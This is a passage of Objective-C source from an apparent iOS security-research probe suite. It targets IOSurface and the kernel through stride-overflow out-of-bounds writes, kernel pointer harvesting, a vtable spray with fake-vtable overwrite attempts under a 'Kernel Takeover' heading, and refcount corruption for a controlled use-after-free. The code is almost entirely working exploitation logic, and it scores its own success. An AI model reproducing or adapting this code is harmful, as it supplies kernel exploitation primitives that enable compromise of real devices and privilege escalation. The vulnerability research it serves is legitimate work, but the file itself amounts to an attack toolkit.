                    if (newFirst != 0x42424242 && newFirst != 0) {
                        dataShifts++;
                        anomalies++;
                        log([NSString stringWithFormat:@"STRIDECORR: DATA CHANGED! %@: first4=0x%08x (was 0x42424242)",
                             keys[k], newFirst]);
                    }
                }
                sym.unlock(testSurf, 1, NULL);

                if (copyValue) {
                    CFTypeRef readBack = copyValue(testSurf, (__bridge CFStringRef)keys[k]);
                    if (readBack) {
                        if ([(__bridge id)readBack isKindOfClass:[NSNumber class]]) {
                            log([NSString stringWithFormat:@"STRIDECORR: %@ readback=%@", keys[k], (__bridge NSNumber *)readBack]);
                        }
                        CFRelease(readBack);
                    }
                }

                CFRelease(testSurf);
            }
            log([NSString stringWithFormat:@"STRIDECORR: Geometry manipulations=%d dataShifts=%d", geomManipulations, dataShifts]);
        }

        if (!isr_stopped()) {
            log(@"STRIDECORR: Step 4 — OOB write via inflated stride + CGBitmapContext");
            IOSurfaceRef bigSurf = sym.create((__bridge CFDictionaryRef)props);
            if (bigSurf) {
                setValue(bigSurf, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(16384));
                sym.lock(bigSurf, 0, NULL);
                void *bigBase = sym.getBase(bigSurf);
                if (bigBase) {
                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 16384,
                        cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                    if (ctx) {
                        CGContextSetRGBFillColor(ctx, 1.0, 0.0, 0.0, 1.0);
                        CGContextFillRect(ctx, CGRectMake(0, 0, 64, 64));

                        void *ctxData = CGBitmapContextGetData(ctx);
                        if (ctxData) {
                            size_t ctxLen = 16384 * 64;
                            uint8_t checkBuf[64];
                            vm_size_t readSz = 0;
                            kern_return_t kr = vm_read_overwrite(mach_task_self(),
                                (vm_address_t)bigBase + sym.getAllocSize(bigSurf), 64,
                                (vm_address_t)checkBuf, &readSz);
                            if (kr == KERN_SUCCESS && readSz > 0) {
                                BOOL nonZero = NO;
                                for (int b = 0; b < 64; b++) {
                                    if (checkBuf[b] != 0) { nonZero = YES; break; }
                                }
                                if (nonZero) {
                                    uint32_t f4 = 0;
                                    memcpy(&f4, checkBuf, 4);
                                    log([NSString stringWithFormat:@"STRIDECORR: OOB DATA beyond alloc: 0x%08x", f4]);
                                    anomalies++;
                                }
                            }
                            (void)ctxLen;
                        }
                        CGContextRelease(ctx);
                    }
                    CGColorSpaceRelease(cs);
                }
                sym.unlock(bigSurf, 0, NULL);
                CFRelease(bigSurf);
            }
        }

        for (int i = 0; i < numPairs; i++) {
            if (surfA[i]) CFRelease(surfA[i]);
            if (surfB[i]) CFRelease(surfB[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"STRIDECORR: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"STRIDECORR: overrides=%d crossWrite=%d geom=%d shifts=%d anomalies=%d",
             strideOverrides, crossSurfWrites, geomManipulations, dataShifts, anomalies]);

        NSString *verdict;
        if (crossSurfWrites > 0) verdict = @"CRITICAL — cross-surface write via stride overflow!";
        else if (dataShifts > 2) verdict = @"HIGH — geometry manipulation causes data/base shifts";
        else if (dataShifts > 0) verdict = @"MEDIUM — some geometry keys affect surface layout";
        else if (strideOverrides > 0) verdict = @"LOW — stride accepted but no observable effect";
        else verdict = @"LOW — no stride manipulation possible";
        log([NSString stringWithFormat:@"STRIDECORR: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"strideOverrides": @(strideOverrides),
            @"crossSurfWrites": @(crossSurfWrites),
            @"geomManipulations": @(geomManipulations),
            @"dataShifts": @(dataShifts)
        };
        isr_checkpoint(@"ISR-StrideCorrupt-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 87: Arbitrary Read Probe
void iosurface_research_arb_read(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"ARBREAD: === Probe 87: Arbitrary Read Probe ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int sharedMapsCreated = 0;
        int probeOOBHits = 0;
        int kptrReads = 0;
        int kptrDataNonZero = 0;
        int addrManipReads = 0;
        int directKernelReads = 0;

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241
        };

        IOSurfaceRef targetSurf = NULL;
        void *targetBase = NULL;
        size_t targetAllocSize = 0;
        vm_address_t sharedMapAddr = 0;
        vm_size_t sharedMapSize = 0;
        mach_port_t memEntry = MACH_PORT_NULL;

        int numProbes = 16;
        IOSurfaceRef probeSurfs[16] = {0};
        void *probeBases[16] = {0};

        NSMutableArray *kptrsFound = [NSMutableArray array];

        if (!isr_stopped()) {
            log(@"ARBREAD: Step 1 — Creating target surface + shared mapping");
            targetSurf = sym.create((__bridge CFDictionaryRef)props);
            if (targetSurf) {
                targetAllocSize = sym.getAllocSize(targetSurf);
                sym.lock(targetSurf, 0, NULL);
                targetBase = sym.getBase(targetSurf);
                if (targetBase) {
                    uint32_t sentinel = 0xFACEB00C;
                    memcpy(targetBase, &sentinel, 4);

                    memory_object_size_t entrySize = targetAllocSize;
                    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
                        &entrySize, (memory_object_offset_t)(uintptr_t)targetBase,
                        VM_PROT_READ | VM_PROT_WRITE | 0x400000,
                        &memEntry, MACH_PORT_NULL);
                    if (kr == KERN_SUCCESS && memEntry != MACH_PORT_NULL) {
                        sharedMapsCreated++;
                        sharedMapSize = (vm_size_t)entrySize;
                        kr = vm_map(mach_task_self(), &sharedMapAddr, sharedMapSize, 0,
                            VM_FLAGS_ANYWHERE, memEntry, 0, FALSE,
                            VM_PROT_READ | VM_PROT_WRITE,
                            VM_PROT_READ | VM_PROT_WRITE,
                            VM_INHERIT_NONE);
                        if (kr == KERN_SUCCESS) {
                            log([NSString stringWithFormat:@"ARBREAD: Shared map at 0x%lx size=0x%lx",
                                 (unsigned long)sharedMapAddr, (unsigned long)sharedMapSize]);
                        }
                    }
                }
                sym.unlock(targetSurf, 0, NULL);
            }
        }

        if (!isr_stopped()) {
            log(@"ARBREAD: Step 2 — Creating 16 probe surfaces");
            for (int i = 0; i < numProbes && !isr_stopped(); i++) {
                probeSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (probeSurfs[i]) {
                    sym.lock(probeSurfs[i], 0, NULL);
                    probeBases[i] = sym.getBase(probeSurfs[i]);
                    if (probeBases[i]) {
                        uint32_t tag = 0xDB0B0000 + i;
                        memcpy(probeBases[i], &tag, 4);
                    }
                    sym.unlock(probeSurfs[i], 0, NULL);
                }
            }
        }

        if (!isr_stopped()) {
            log(@"ARBREAD: Step 3 — OOB reads from probe surfaces collecting kernel pointers");
            size_t scanOffsets[] = {
                0x1000, 0x2000, 0x4000, 0x8000, 0x10000, 0x20000,
                0x40000, 0x80000, 0x100000, 0x200000, 0x400000, 0x800000
            };
            for (int p = 0; p < numProbes && !isr_stopped(); p++) {
                if (!probeBases[p]) continue;
                for (int o = 0; o < 12 && !isr_stopped(); o++) {
                    uint8_t buf[64];
                    vm_size_t readSize = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                        (vm_address_t)probeBases[p] + scanOffsets[o], 64,
                        (vm_address_t)buf, &readSize);
                    if (kr == KERN_SUCCESS && readSize >= 8) {
                        probeOOBHits++;
                        for (size_t b = 0; b < readSize; b += 8) {
                            uint64_t val = 0;
                            memcpy(&val, buf + b, 8);
                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                kptrReads++;
                                if (kptrsFound.count < 50) {
                                    [kptrsFound addObject:@(val)];
                                }
                            }
                        }
                    }
                }
            }
            log([NSString stringWithFormat:@"ARBREAD: Collected %d kernel pointers from %d OOB reads",
                 kptrReads, probeOOBHits]);
        }

        if (!isr_stopped() && setValue) {
            log(@"ARBREAD: Step 4 — Address manipulation via IOSurfaceSetValue");
            NSArray *addrKeys = @[@"IOSurfaceOffset", @"IOSurfacePlaneOffset",
                                 @"IOSurfacePlaneBase", @"IOSurfaceAllocSize"];

            for (NSNumber *kptrNum in kptrsFound) {
                if (isr_stopped()) break;
                if (addrManipReads >= 10) break;
                uint64_t kptr = [kptrNum unsignedLongLongValue];

                for (NSString *key in addrKeys) {
                    if (isr_stopped()) break;
                    IOSurfaceRef manipSurf = sym.create((__bridge CFDictionaryRef)props);
                    if (!manipSurf) continue;

                    setValue(manipSurf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(kptr));

                    sym.lock(manipSurf, 1, NULL);
                    void *manipBase = sym.getBase(manipSurf);
                    if (manipBase) {
                        uint8_t readBuf[64];
                        memset(readBuf, 0, 64);
                        vm_size_t readSz = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)manipBase, 64,
                            (vm_address_t)readBuf, &readSz);
                        if (kr == KERN_SUCCESS && readSz > 0) {
                            uint64_t first8 = 0;
                            memcpy(&first8, readBuf, 8);
                            if (first8 != 0) {
                                addrManipReads++;
                                anomalies++;
                                log([NSString stringWithFormat:@"ARBREAD: %@ = 0x%llx -> base data=0x%llx",
                                     key, kptr, first8]);
                            }
                        }
                    }
                    sym.unlock(manipSurf, 1, NULL);
                    CFRelease(manipSurf);
                }
            }
            log([NSString stringWithFormat:@"ARBREAD: Address manipulation reads=%d", addrManipReads]);
        }

        if (!isr_stopped()) {
            log(@"ARBREAD: Step 5 — Direct vm_read at kernel pointer addresses");
            NSMutableSet *triedPages = [NSMutableSet set];
            for (NSNumber *kptrNum in kptrsFound) {
                if (isr_stopped()) break;
                if (directKernelReads >= 20) break;
                uint64_t kptr = [kptrNum unsignedLongLongValue];
                vm_address_t pageAddr = (vm_address_t)(kptr & ~0xFFFULL);
                NSNumber *pageKey = @(pageAddr);
                if ([triedPages containsObject:pageKey]) continue;
                [triedPages addObject:pageKey];

                uint8_t kbuf[64];
                vm_size_t kread = 0;
                kern_return_t kr = vm_read_overwrite(mach_task_self(), pageAddr, 64, (vm_address_t)kbuf, &kread);
                if (kr == KERN_SUCCESS && kread > 0) {
                    directKernelReads++;
                    anomalies++;
                    uint64_t first8 = 0;
                    memcpy(&first8, kbuf, 8);
                    log([NSString stringWithFormat:@"ARBREAD: DIRECT KERNEL READ! page=0x%lx data=0x%llx (%d bytes)",
                         (unsigned long)pageAddr, first8, (int)kread]);

                    for (size_t b = 0; b < kread; b += 8) {
                        uint64_t val = 0;
                        memcpy(&val, kbuf + b, 8);
                        if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                            kptrDataNonZero++;
                            if (kptrDataNonZero <= 5) {
                                log([NSString stringWithFormat:@"ARBREAD: KTEXT PTR in kernel data +%zu: 0x%llx", b, val]);
                            }
                        }
                    }
                } else {
                    // expected — most kernel addresses not readable from userland
                }
            }
            log([NSString stringWithFormat:@"ARBREAD: Direct kernel reads=%d, kernel text ptrs in data=%d",
                 directKernelReads, kptrDataNonZero]);
        }

        if (!isr_stopped()) {
            log(@"ARBREAD: Step 6 — Remap-based read at shared region addresses");
            vm_address_t sharedRegions[] = {0x1004b8000, 0x16fb3c000, 0x16fcc8000, 0x16fd54000, 0x16fd58000};
            for (int r = 0; r < 5 && !isr_stopped(); r++) {
                vm_address_t remapAddr = 0;
                vm_prot_t curProt = VM_PROT_NONE, maxProt = VM_PROT_NONE;
                kern_return_t kr = vm_remap(mach_task_self(),
                    &remapAddr, 0x4000, 0,
                    VM_FLAGS_ANYWHERE,
                    mach_task_self(),
                    sharedRegions[r],
                    FALSE,
                    &curProt, &maxProt,
                    VM_INHERIT_NONE);
                if (kr == KERN_SUCCESS) {
                    uint8_t rBuf[64];
                    vm_size_t rRead = 0;
                    kern_return_t kr2 = vm_read_overwrite(mach_task_self(), remapAddr, 64, (vm_address_t)rBuf, &rRead);
                    if (kr2 == KERN_SUCCESS && rRead > 0) {
                        uint64_t first8 = 0;
                        memcpy(&first8, rBuf, 8);
                        anomalies++;
                        log([NSString stringWithFormat:@"ARBREAD: SHARED REMAP 0x%lx -> 0x%lx data=0x%llx",
                             (unsigned long)sharedRegions[r], (unsigned long)remapAddr, first8]);
                    }
                    vm_deallocate(mach_task_self(), remapAddr, 0x4000);
                }
            }
        }

        if (sharedMapAddr) vm_deallocate(mach_task_self(), sharedMapAddr, sharedMapSize);
        if (memEntry != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), memEntry);
        for (int i = 0; i < numProbes; i++) {
            if (probeSurfs[i]) CFRelease(probeSurfs[i]);
        }
        if (targetSurf) CFRelease(targetSurf);

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"ARBREAD: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"ARBREAD: maps=%d oobHits=%d kptrs=%d addrManip=%d directReads=%d ktextInData=%d anomalies=%d",
             sharedMapsCreated, probeOOBHits, kptrReads, addrManipReads, directKernelReads, kptrDataNonZero, anomalies]);

        NSString *verdict;
        if (directKernelReads > 0 && kptrDataNonZero > 0) verdict = @"CRITICAL — kernel memory readable with text pointers!";
        else if (directKernelReads > 0) verdict = @"CRITICAL — kernel pointer addresses readable from userland!";
        else if (addrManipReads > 0) verdict = @"HIGH — address manipulation yields different data";
        else if (kptrReads > 20) verdict = @"HIGH — massive kernel pointer collection";
        else if (probeOOBHits > 0) verdict = @"MEDIUM — OOB reads successful";
        else verdict = @"LOW — no kernel read achieved";
        log([NSString stringWithFormat:@"ARBREAD: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"sharedMapsCreated": @(sharedMapsCreated),
            @"probeOOBHits": @(probeOOBHits),
            @"kptrReads": @(kptrReads),
            @"addrManipReads": @(addrManipReads),
            @"directKernelReads": @(directKernelReads),
            @"kptrDataNonZero": @(kptrDataNonZero)
        };
        isr_checkpoint(@"ISR-ArbRead-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Round 29: Kernel Takeover

// ─── Probe 88: Vtable Spray + Confusion ───

void iosurface_research_vtbl_spray(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"VTBLSPRAY: === Probe 88: Vtable Spray + Confusion ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int sprayedSurfaces = 0;
        int vtablesFound = 0;
        int writeAttempts = 0;
        int vtableDispatches = 0;
        int oobScans = 0;
        int crossRefHits = 0;

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
        CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
        typedef size_t (*GetPropMaxFn)(IOSurfaceRef, CFStringRef);
        GetPropMaxFn getPropMax = (GetPropMaxFn)dlsym(sym.iosurface, "IOSurfaceGetPropertyMaximum");

        // Step 1: Spray 200 surfaces with varying sizes
        log(@"VTBLSPRAY: Step 1 — Spraying 200 surfaces with varying sizes");
        const int SPRAY_COUNT = 200;
        IOSurfaceRef spraySurfs[200];
        memset(spraySurfs, 0, sizeof(spraySurfs));

        int sizes[] = {4096, 8192, 16384, 32768, 65536, 131072};
        int numSizes = 6;

        if (!isr_stopped()) {
            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
                int sz = sizes[i % numSizes];
                int dim = (int)sqrt((double)sz / 4);
                if (dim < 1) dim = 1;
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @(dim),
                    @"IOSurfaceHeight": @(dim),
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241,
                };
                spraySurfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (spraySurfs[i]) sprayedSurfaces++;
            }
            log([NSString stringWithFormat:@"VTBLSPRAY: Sprayed %d surfaces", sprayedSurfaces]);
        }

        // Step 2: Lock surfaces and scan OOB for vtable pointers
        log(@"VTBLSPRAY: Step 2 — Scanning OOB for vtable pointers");
        uint64_t vtableAddrs[64];
        int vtableCount = 0;
        int vtableSurfIdx[64];

        if (!isr_stopped()) {
            for (int i = 0; i < SPRAY_COUNT && !isr_stopped() && vtableCount < 64; i++) {
                if (!spraySurfs[i]) continue;
                uint32_t seed = 0;
                kern_return_t kr = sym.lock(spraySurfs[i], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(spraySurfs[i]);
                size_t allocSz = sym.getAllocSize(spraySurfs[i]);
                if (!base || allocSz == 0) {
                    sym.unlock(spraySurfs[i], 0, &seed);
                    continue;
                }

                // Scan forward OOB in 8-byte steps, up to 8KB beyond alloc
                for (size_t off = allocSz; off < allocSz + 8192 && !isr_stopped(); off += 8) {
                    oobScans++;
                    vm_address_t srcAddr = (vm_address_t)base + off;
                    uint64_t val = 0;
                    vm_size_t readSz = 0;
                    kern_return_t rkr = vm_read_overwrite(mach_task_self(), srcAddr, 8, (vm_address_t)&val, &readSz);
                    if (rkr != KERN_SUCCESS || readSz != 8) continue;

                    // Check for kernel TEXT vtable range (0xFFFFFFF0xxxxxxxx)
                    BOOL isTextVtbl = (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL;
                    // Check for OTHER vtable range (0xFFFFFFFDxxxxxxxx)
                    BOOL isOtherVtbl = (val & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFD00000000ULL;

                    if (isTextVtbl || isOtherVtbl) {
                        vtableAddrs[vtableCount] = val;
                        vtableSurfIdx[vtableCount] = i;
                        vtableCount++;
                        vtablesFound++;
                        log([NSString stringWithFormat:@"VTBLSPRAY: VTABLE at S%d+0x%lx: 0x%llx %s",
                             i, (unsigned long)(off - allocSz), val,
                             isTextVtbl ? "[TEXT]" : "[OTHER]"]);
                        anomalies++;
                    }
                }
                sym.unlock(spraySurfs[i], 0, &seed);
            }
            log([NSString stringWithFormat:@"VTBLSPRAY: Found %d vtable pointers in %d OOB scans", vtablesFound, oobScans]);
        }

        // Step 3: Attempt vtable overwrite via multiple methods
        log(@"VTBLSPRAY: Step 3 — Attempting vtable overwrites");

        if (!isr_stopped() && vtableCount > 0) {
            for (int v = 0; v < vtableCount && !isr_stopped(); v++) {
                int sIdx = vtableSurfIdx[v];
                if (!spraySurfs[sIdx]) continue;

                uint32_t seed = 0;
                kern_return_t kr = sym.lock(spraySurfs[sIdx], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(spraySurfs[sIdx]);
                size_t allocSz = sym.getAllocSize(spraySurfs[sIdx]);

                // Method A: vm_write to OOB region with fake vtable
                uint64_t fakeVtable = 0x4141414142424242ULL;
                size_t vtableOff = allocSz; // approximate
                vm_address_t writeAddr = (vm_address_t)base + vtableOff;
                kern_return_t wkr = vm_write(mach_task_self(), writeAddr, (vm_offset_t)&fakeVtable, 8);
                writeAttempts++;
                if (wkr == KERN_SUCCESS) {
                    log([NSString stringWithFormat:@"VTBLSPRAY: vm_write SUCCEEDED at S%d+0x%lx!", sIdx, (unsigned long)vtableOff]);
                    anomalies += 5;
                }

                // Method B: IOSurfaceSetValue with crafted data targeting vtable
                if (setValue && !isr_stopped()) {
                    uint8_t craftedData[256];
                    memset(craftedData, 0x41, sizeof(craftedData));
                    // Place fake vtable pointer pattern at multiple offsets
                    uint64_t fakePtr = 0xDEADBEEFCAFEBABEULL;
                    for (int off = 0; off < 256; off += 8) {
                        memcpy(craftedData + off, &fakePtr, 8);
                    }
                    CFDataRef data = CFDataCreate(NULL, craftedData, sizeof(craftedData));
                    if (data) {
                        setValue(spraySurfs[sIdx], CFSTR("IOSurfaceVtablePayload"), (CFTypeRef)data);
                        writeAttempts++;
                        CFRelease(data);
                    }
                }

                // Method C: Cross-surface stride write targeting vtable offset
                if (setValue && !isr_stopped()) {
                    // Override BytesPerRow to giant value for OOB write
                    setValue(spraySurfs[sIdx], CFSTR("IOSurfaceBytesPerRow"),
                             (__bridge CFTypeRef)@(allocSz + 4096));
                    writeAttempts++;

                    // Create CG context with inflated stride for OOB write
                    size_t bpr = allocSz + 4096;
                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 2, 8, bpr,
                                                             cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                    if (ctx) {
                        CGContextSetRGBFillColor(ctx, 0.42, 0.42, 0.42, 1.0);
                        CGContextFillRect(ctx, CGRectMake(0, 0, 64, 2));
                        CGContextRelease(ctx);
                        writeAttempts++;
                    }
                    CGColorSpaceRelease(cs);
                }

                sym.unlock(spraySurfs[sIdx], 0, &seed);

                // Step 4: Trigger vtable dispatch to detect corruption
                if (!isr_stopped()) {
                    // Call functions that internally dispatch through vtable
                    @try {
                        size_t w = sym.getWidth(spraySurfs[sIdx]);
                        size_t h = sym.getHeight(spraySurfs[sIdx]);
                        size_t as2 = sym.getAllocSize(spraySurfs[sIdx]);
                        vtableDispatches++;
                        if (w == 0 || h == 0 || as2 == 0) {
                            log([NSString stringWithFormat:@"VTBLSPRAY: ANOMALY — getter returned 0 after overwrite attempt on S%d!", sIdx]);
                            anomalies += 3;
                        }

                        // Check if property reads return corrupted data
                        if (copyValue) {
                            CFTypeRef val = copyValue(spraySurfs[sIdx], CFSTR("IOSurfaceVtablePayload"));
                            if (val) {
                                crossRefHits++;
                                CFRelease(val);
                            }
                        }
                    } @catch (NSException *e) {
                        log([NSString stringWithFormat:@"VTBLSPRAY: EXCEPTION during vtable dispatch: %@", e.reason]);
                        anomalies += 10;
                    }
                }
            }
        }

        // Step 5: Cross-surface vtable reference scan
        log(@"VTBLSPRAY: Step 4 — Cross-surface vtable reference scan");
        if (!isr_stopped()) {
            for (int i = 0; i < SPRAY_COUNT - 1 && !isr_stopped(); i += 2) {
                if (!spraySurfs[i] || !spraySurfs[i+1]) continue;
                uint32_t seed = 0;
                kern_return_t kr = sym.lock(spraySurfs[i], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(spraySurfs[i]);
                size_t allocSz = sym.getAllocSize(spraySurfs[i]);
                if (base && allocSz > 0) {
                    // Scan beyond this surface into potentially adjacent one
                    for (size_t off = allocSz; off < allocSz + 16384 && !isr_stopped(); off += 64) {
                        uint64_t chunk[8];
                        vm_size_t readSz = 0;
                        kern_return_t rkr = vm_read_overwrite(mach_task_self(),
                                                              (vm_address_t)base + off, 64,
                                                              (vm_address_t)chunk, &readSz);
                        if (rkr != KERN_SUCCESS || readSz != 64) continue;

                        // Check for sentinel patterns from adjacent surface
                        for (int j = 0; j < 8; j++) {
                            if ((chunk[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                                crossRefHits++;
                                if (crossRefHits <= 10) {
                                    log([NSString stringWithFormat:@"VTBLSPRAY: XREF S%d+0x%lx[%d]: 0x%llx",
                                         i, (unsigned long)(off - allocSz), j, chunk[j]]);
                                }
                            }
                        }
                    }
                }
                sym.unlock(spraySurfs[i], 0, &seed);
            }
        }

        // Cleanup
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (spraySurfs[i]) CFRelease(spraySurfs[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"VTBLSPRAY: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"VTBLSPRAY: sprayed=%d vtables=%d writes=%d dispatches=%d xrefs=%d anomalies=%d",
             sprayedSurfaces, vtablesFound, writeAttempts, vtableDispatches, crossRefHits, anomalies]);

        NSString *verdict;
        if (anomalies > 15) verdict = @"CRITICAL — vtable corruption indicators detected!";
        else if (vtablesFound > 5) verdict = @"HIGH — multiple vtable pointers accessible via OOB";
        else if (crossRefHits > 0) verdict = @"MEDIUM — cross-surface vtable references found";
        else verdict = @"LOW — vtable spray completed, no corruption achieved";
        log([NSString stringWithFormat:@"VTBLSPRAY: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"sprayedSurfaces": @(sprayedSurfaces),
            @"vtablesFound": @(vtablesFound),
            @"writeAttempts": @(writeAttempts),
            @"vtableDispatches": @(vtableDispatches),
            @"crossRefHits": @(crossRefHits)
        };
        isr_checkpoint(@"ISR-VtblSpray-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// ─── Probe 89: Refcount Corruption for Controlled UAF ───

void iosurface_research_refcount_corrupt(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"REFCORR: === Probe 89: Refcount Corruption — Controlled UAF ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int sentinelsFound = 0;
        int refcountWrites = 0;
        int uafDetected = 0;
        int pageReclaims = 0;
        int remapReads = 0;
        int staleDataHits = 0;

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");

        // Step 1: Create target surface and get its mapping
        log(@"REFCORR: Step 1 — Creating target surface + vm_remap mapping");

        NSDictionary *props = @{
            @"IOSurfaceWidth": @256,
            @"IOSurfaceHeight": @256,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
        };

        IOSurfaceRef targetSurf = NULL;
        vm_address_t remapAddr = 0;
        vm_size_t remapSize = 0;
        void *targetBase = NULL;
        size_t targetAllocSz = 0;

        if (!isr_stopped()) {
            targetSurf = sym.create((__bridge CFDictionaryRef)props);
            if (!targetSurf) {
                log(@"REFCORR: Failed to create target surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            uint32_t seed = 0;
            sym.lock(targetSurf, 0, &seed);
            targetBase = sym.getBase(targetSurf);
            targetAllocSz = sym.getAllocSize(targetSurf);

            // Write sentinel pattern into the surface
            if (targetBase && targetAllocSz > 0) {
                uint32_t sentinel = 0x494F5346; // "IOSF"
                for (size_t off = 0; off < targetAllocSz && off < 4096; off += 64) {
                    memcpy((uint8_t *)targetBase + off, &sentinel, 4);
                    uint32_t marker = (uint32_t)(off / 64);
                    memcpy((uint8_t *)targetBase + off + 4, &marker, 4);
                }
            }

            // Create vm_remap mapping of the surface pages
            if (targetBase && targetAllocSz > 0) {
                remapSize = targetAllocSz;
                vm_prot_t curProt, maxProt;
                kern_return_t kr = vm_remap(mach_task_self(), &remapAddr, remapSize, 0,
                                            VM_FLAGS_ANYWHERE, mach_task_self(),
                                            (vm_address_t)targetBase, FALSE,
                                            &curProt, &maxProt, VM_INHERIT_NONE);
                if (kr == KERN_SUCCESS) {
                    log([NSString stringWithFormat:@"REFCORR: vm_remap OK: 0x%lx -> 0x%lx size=%zu",
                         (unsigned long)targetBase, (unsigned long)remapAddr, (size_t)remapSize]);
                    remapReads++;
                } else {
                    log(@"REFCORR: vm_remap failed");
                    remapAddr = 0;
                }
            }

            sym.unlock(targetSurf, 0, &seed);
        }

        // Step 2: Scan backward OOB for IOSurface metadata header
        log(@"REFCORR: Step 2 — Backward OOB scan for IOSurface metadata header");

        uint64_t headerAddr = 0;
        int refcountOffset = -1;

        if (!isr_stopped() && targetBase) {
            uint32_t seed2 = 0;
            sym.lock(targetSurf, 0, &seed2);

            // Scan backward from base address looking for sentinel patterns
            for (int negOff = 64; negOff <= 16384 && !isr_stopped(); negOff += 8) {
                vm_address_t scanAddr = (vm_address_t)targetBase - negOff;
                uint64_t val = 0;
                vm_size_t readSz = 0;
                kern_return_t kr = vm_read_overwrite(mach_task_self(), scanAddr, 8, (vm_address_t)&val, &readSz);
                if (kr != KERN_SUCCESS || readSz != 8) continue;

                // Look for kernel pointer patterns that indicate object header
                BOOL isKptr = (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL;
                BOOL isOther = (val & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFD00000000ULL;

                if (isKptr || isOther) {
                    sentinelsFound++;
                    if (sentinelsFound <= 20) {
                        log([NSString stringWithFormat:@"REFCORR: HEADER candidate at base-0x%x: 0x%llx %s",
                             negOff, val, isKptr ? "[KPTR]" : "[OTHER]"]);
                    }

                    // Check surrounding 64 bytes for refcount-like values (small integers)
